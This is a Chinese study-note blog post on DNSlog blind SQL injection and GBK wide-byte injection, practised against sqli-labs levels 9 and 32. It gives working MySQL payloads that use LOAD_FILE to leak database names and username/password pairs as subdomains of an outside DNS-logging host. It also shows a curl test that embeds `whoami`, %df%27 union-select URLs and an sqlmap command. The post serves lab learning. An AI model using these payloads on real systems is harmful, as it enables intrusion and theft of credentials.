---
layout: post
title: SQL注入注入学习笔记3
lastUpdate: 2021-07-12
author: 404player
header-img: img/post-bg-sql-a.jpg
catalog: true 	
tags: [SQL注入]
---  

继续来进行`SQL注入`的学习，今天要介绍的两种注入为： **Dnslog盲注**和**宽字节注入**  

## DNS盲注



### Dns盲注原理

**Dnslog盲注**更准确来说并不算是一种注入类型，而是一种注入的手段  

什么是`Dnslog`呢？通俗来讲，当客户端去访问一个域名的时候，需要通过域名解析服务(DNS)来获取服务端的`IP`地址，域名解析服务由一种特殊的服务器———DNS服务器提供。每进行一次解析服务，DNS服务器会写入带有`访问域名及其相关信息`的日志信息，这类信息我们就可以称之为`Dnslog`  

之前我们已经学过的布尔盲注或者是时间盲注，是在页面既不会回显数据，也不会显示错误信息的场景下进行应用的。但无论是时间盲注还是布尔注入，本质上都是一种`猜单词`的游戏，其时间成本是很高的。`Dnslog注入`则比较好地解决了这个问题，它会使注入信息回显在`DNS`平台的日志信息上，使注入效率有所提高。  

我们用`DNS`平台`http://ceye.io`为例，首先要说明`DNSlog`包括两部分的信息，如图所示  

![image-20210712083102627](https://raw.githubusercontent.com/404player/pic-bed/main/typora202107/18/081530-532785.png)

上图是`i春秋ADO老师`讲解`Dnslog`时使用的示意图，由图可见，`Dnslog`主要分`HTTP Request`和`Dns Query`，其中`HTTP Request`包括请求地址，请求源IP，请求方式及`UserAgent`等等信息，而`DNS Query`则包括请求地址及请求源IP。  



### 实验环节

了解这些信息后，究竟怎么才能让`Dnslog`的日志信息里回显我们需要的信息呢？  

我们先来了解一下`ceye.io`这个平台，当我们注册完成以后，这个DNS平台会给我们一个每个账号都特有的`Dnsurl`,而当我们去访问这个地址的时候，平台就会记录我们访问的`Dnslog`日志。  

如图，就是我账号的`Dnsurl`  

![image-20210712195249241](https://raw.githubusercontent.com/404player/pic-bed/main/typora202107/18/110730-357763.png)

我们尝试用`curl`命令去访问这个地址（`curl`是`Linux`中用于网络请求的工具，所以我使用我的`Ubuntu`服务器进行演示）  

![](https://raw.githubusercontent.com/404player/pic-bed/main/typora202107/18/082100-435851.jpeg)

`Dns`平台会返回一条信息，这条信息并不重要，这里不做重要解读。我们重点看看在`ceye.io`这个平台中记录了什么内容  

![image-20210712200113102](C:\Users\geekboy\AppData\Roaming\Typora\typora-user-images\image-20210712200113102.png)

我们可以看到，`ceye`平台记录了请求地址，请求来源和请求建立的时间，我们开拓思路，将`xx`改成```/`whoami`/```(此处的斜杠号只是为了区分`markdown`语法的引用符，在渗透中应该将之删去），我们看看发生了什么？

![image-20210712201040908](C:\Users\geekboy\AppData\Roaming\Typora\typora-user-images\image-20210712201040908.png)



![](https://raw.githubusercontent.com/404player/pic-bed/main/typora202107/18/081745-973722.jpeg)

可见服务器先执行了`whoami`指令，再执行`curl`命令发起请求，导致`whoami`信息被记录在了`Dnslog`中，通过这次实验我们就可以确定我们的注入思路了。如果我们可以把注入语句拼接到`Dnsurl`上构成子域名，再进行访问，`Dns`平台上是否就直接把注入信息给记录下来了呢？

在`Mysql`中，恰好就有函数可以实现网络请求的需求，经过构造，我们可以得到`Dnslog`的核心语句：

```Mysql
SELECT LOAD_FILE(CONCAT('\\\\',(select database()),'.mysql.mfzmsj.ceye.io\\abc'));
```

通过`load_file()`函数发起请求，使用`Dnslog`接受请求，获取数据。  

构造语句中有几点是值得注意的：

- `'\\\\'`是固定格式，不需要改动
- 中间拼接的语句就是`SQL`查询语句，只要对这一部分语句进行构造，就能实现有回显的`SQL`注入
- 第三部分的拼接要注意在`Dnsurl`后随便加`\\abc`,`abc`可取任意合法的文件名，指定`load_file`访问服务器此文件
- 构造的SQL查询语句，由于在`load_file`函数中，所以数据格式和内容都有限制，比如不能出现`~@`等特殊字符
- `LOAD_FILE`只有在`Windows`系统中才能生效，因此，假若系统为`Linux`系统，则无法使用`Dnslog`盲注



接下来按照正常的注入流程就好了，用其他注入查询语句代替`select database()`(本次实验的实验环境是sqli - labs第9关)

- 查询表名

  ```sql
  SELECT LOAD_FILE(CONCAT('\\\\',(select table_name from information_schema.tables where table_schema = database() limit 0,1),'.mysql.mfzmsj.ceye.io\\abc'));
  ```

  

  ![](https://raw.githubusercontent.com/404player/pic-bed/main/typora202107/18/082512-386064.jpeg)

接下来的流程就不作详述了，对数据库查询语句不熟悉的可以看前两期的`SQL注入学习笔记`

还有一个细节问题，由于在`load_file`函数中，数据格式和内容都有限制，所以在最后一步注入`user`和`password`的时候，没法像以前那样用`~`将两者连接起来，这里提供两种解决办法

- 用一个大写字母将`user`和`password`隔离开来

  ```sql
  SELECT LOAD_FILE(CONCAT('\\\\',(select concat_ws('A',username,password) from security.users limit 0,1),'.mysql.mfzmsj.ceye.io\\abc'));
  ```

  ![](https://raw.githubusercontent.com/404player/pic-bed/main/typora202107/18/083338-307700.jpeg)

- 用`~`分割，然后用hash将整一串字符转化为`hex hash`值，最后取到数据以后再进行解码

  ```sql
  SELECT LOAD_FILE(CONCAT('\\\\',(select hex(concat_ws('~',username,password)) from security.users limit 0,1),'.mysql.mfzmsj.ceye.io\\abc'));
  ```

  ![](https://raw.githubusercontent.com/404player/pic-bed/main/typora202107/18/083637-816439.jpeg)

  

![](https://raw.githubusercontent.com/404player/pic-bed/main/typora202107/18/083700-499469.jpeg)

### 利用脚本自动化注入

通过上文我们可知，最优的方法是通过`limit`逐个注入，还得通过`hex`解码，注入的效率其实很低，我们可以利用脚本实现自动化注入。

`Dns注入`的利用脚本我们在`github`上能找到一份：`https://github.com/ADOOO/DnslogSqlinj`

通过`Readme.md`知道你要`Editor config.py APItoken and DNSurl with yours!`，需要稍微改动一下信息

然后可以开始注入了

![](https://raw.githubusercontent.com/404player/pic-bed/main/typora202107/18/084415-447763.jpeg)

可以先运行一下`check`查看网站是否存在`Dnslog`注入

![](https://raw.githubusercontent.com/404player/pic-bed/main/typora202107/18/084811-256186.jpeg)

可以看到检测到dnslog注入了，并且给出了注入的语句，我们就可以通过参数提示一步步来注入，最终成果如下

![](https://raw.githubusercontent.com/404player/pic-bed/main/typora202107/18/085253-323520.jpeg)



### 源码分析

```php
if(isset($_GET['id']))
{
$id=$_GET['id'];
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

// connectivity 


$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

	if($row)
	{
  	echo '<font size="5" color="#FFFF00">';	
  	echo 'You are in...........';
  	echo "<br>";
    	echo "</font>";
  	}
	else 
	{
	
	echo '<font size="5" color="#FFFF00">';
	echo 'You are in...........';
	//print_r(mysql_error());
	//echo "You have an error in your SQL syntax";
	echo "</br></font>";	
	echo '<font color= "#0000ff" font size= 3>';	
	
	}
}
```

可以看出，这段源码其实跟之前的布尔注入一般无二，都是获取`id`直接拼接到`sql`语句中进行查询，且页面无回显信息和报错，两种应用场景是相同的，`Dnslog`只是在`Windows`服务器的环境下可以利用`load_file`的函数特点提高注入的效率



##  宽字节注入

### 宽字节注入原理

我们知道在某些编码中，英文占一个字节，成为单字节，中文占据两个字节，而超过一个字节的，皆可称为宽字节。

像`GB2312、GBK、GB18030、BIG5、Shift_JIS`这些就是我们常说的宽字节。

对于`SQL`注入这一长期活跃的安全漏洞，现在的网站都会有相应的防御措施。而早期的措施之一就是将`SQL注入`中常用的`'`转义成`\'`。

这个时候单引号就不再具有闭合作用的，只是单纯的一撇了。

那怎么绕过这个防御机制继续进行`SQL`注入呢？就需要我们想办法将`\`消灭掉。

那我们首先要清楚一个事实：**当Mysql在使用GBK编码的时候，会认为两个字符为一个汉字**，所以我们可以通过多输入一个特殊的字符，使得这个字符和后面的斜杠组合成一个汉字的编码，从而将斜杠消除掉。（注：输入的这个特殊的字符以16进制表示要大于128，因为前一个Ascii码大于128时才能到汉字的范围）

比如输入`%df'`,此时通过`url`转义就会变成`%df\'`，编码为`%df%5C%27`,由于`%df`大于128，所以`%df%5C`会认为是一个汉字`運`,从而使得注入语句为`id = 運' and'`，实现绕过斜杠进行注入



### 源码分析

这次的实验环境选取的是`sqli - labs`的32关，先来看看源码

```php
function check_addslashes($string)
{
    $string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string);          //escape any backslash
    $string = preg_replace('/\'/i', '\\\'', $string);                               //escape single quote with a backslash
    $string = preg_replace('/\"/', "\\\"", $string);                                //escape double quote with a backslash
      
    
    return $string;
}

// take the variables 
if(isset($_GET['id']))
{
$id=check_addslashes($_GET['id']);
//echo "The filtered request is :" .$id . "<br>";

//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);
    
mysql_query("SET NAMES gbk");
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
```

重点关注`check_addslashes`,这个函数的作用其实就是对一些特殊字符进行了转义，将`'`转化成了`\'`，将`"`转化成了`\"`。  

然后获取`id`值经过转义后直接带入查询语句中，通过源码可以看出数据库连接时使用的时`GBK`编码，所以可以进行宽字节注入。

### 实验环节

清楚原理以后，我们就可以通过简单的`union`注入进行注入了

先判断输入的列数

```sql
http://127.0.0.1/sqli-labs-master/Less-32/?id=1%df%27 order by 3 --+
```

判断回显位置

```sql
http://127.0.0.1/sqli-labs-master/Less-32/?id=%df%27 union select 1,2,3 --+
```

在回显位置进行查询语句的插入

```sql
http://127.0.0.1/sqli-labs-master/Less-32/?id=%df%27 union select 1,(select user()),3 --+
```

然后按照常规的注入流程进行就可以了。



### 使用sqlmap进行自动化注入

先尝试一下直接使用`url`测试，看看有没有可注入的参数



![image-20210718104313968](https://raw.githubusercontent.com/404player/pic-bed/main/typora202107/18/104334-139799.png)

使用`%df`后拼接再次进行注入

`python sqlmap.py "http://127.0.0.1/sqli-labs-master/Less-32/?id=1%df"`

最终查询得知可注入

![image-20210718104856344](C:\Users\geekboy\Desktop\web安全作业截图\sqlmap2.png)

随后可按照常规注入步骤进行查询，这里只显示第一步和最后一步

![image-20210718105129921](https://raw.githubusercontent.com/404player/pic-bed/main/typora202107/18/105419-663830.png)

![image-20210718105441733](https://raw.githubusercontent.com/404player/pic-bed/main/typora202107/18/105451-521910.png)

![image-20210718105511121](https://raw.githubusercontent.com/404player/pic-bed/main/typora202107/18/105528-709121.png)

注入完成！